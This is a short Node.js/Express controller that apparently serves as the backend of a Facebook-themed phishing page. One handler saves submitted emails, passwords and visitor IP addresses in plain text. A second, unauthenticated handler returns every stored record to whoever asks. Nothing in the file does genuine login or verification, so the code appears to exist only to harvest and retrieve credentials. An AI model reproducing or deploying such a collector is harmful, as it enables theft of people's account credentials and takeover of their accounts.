const FBData = require("../models/fb");

const postFB = async (req, res) => {
  const { email, password, ip } = req.body;

  const fb = new FBData({
    email,
    password,
    ip,
  });

  await fb.save();
  res.json({
    msg: "post",
    ok: true,
  });
};

const getFBData = async (req, res) => {
  const fbData = await FBData.find({});
  res.json({ fbData });
};

module.exports = {
  postFB,
  getFBData,
};
